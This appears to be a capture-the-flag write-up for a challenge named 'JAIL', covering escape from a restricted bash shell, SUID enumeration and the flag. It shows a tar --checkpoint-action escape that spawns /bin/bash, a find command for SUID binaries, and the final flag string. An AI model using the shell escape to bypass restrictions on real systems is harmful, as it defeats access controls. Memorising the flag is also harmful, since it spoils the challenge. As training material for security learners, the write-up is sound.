# JAIL - Official Writeup

## Challenge Description
Locked in Mojo-Jojo's unbreakable prison. Decoys laugh at you. The real flag hides deep. Escape and steal the ape's secrets—or stay caged forever.

## Step-by-Step Solution

### 1. Environment Enumeration
Upon logging in, you find yourself in a restricted shell (`rbash`). You can explore available commands by looking at your `PATH`:
```bash
echo $PATH
# Output: /home/ctfuser/jail
```
Checking the `jail` directory:
```bash
ls jail/
# (If ls is missing, use echo jail/*)
# Output: jail/tar
```
You only have the `tar` command at your disposal.

### 2. Exploiting Tar to Escape
The restricted shell (`rbash`) prevents you from running commands with slashes (e.g., `/bin/bash`). However, you can use the `--checkpoint` and `--checkpoint-action` flags of `tar` to execute commands.

Execute the following to escape to a full `bash` shell:
```bash
tar -cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 3. Locating the Real Flag
Once in a full bash shell, you can search the filesystem. You will find several decoy flags:
- `/home/ctfuser/flag.txt`
- `/tmp/flag.txt`
- `/home/ctfuser/.flag`

These are all sarcastic decoys. The real flag is located at `/opt/.secrets/flag.txt`, but it is owned by root and has permissions `400` (readable only by root).

### 4. Privilege Escalation (Restricted)
To read the flag, you need to find a way to gain its contents. Searching for SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```
This reveals a custom binary: `/opt/hidden_bins/flag_reader`.

### 5. Capturing the Flag
Run the SUID binary to read the flag:
```bash
/opt/hidden_bins/flag_reader
```

**Final Flag:**
`MOJO-JOJO{W0W_YOU_F0UND_IT_DO_YOU_WANT_A_B4NAN4_FOR_Y0UR_MEDIOCRE_EFFORT?!!}`

## Security Note
The shell is hardened with aliases for `function` and `braceexpand` disabled to prevent easy shell function definitions within `rbash`. The `flag_reader` is a single-purpose static binary that only reads the hardcoded flag path, preventing arbitrary root escalation.
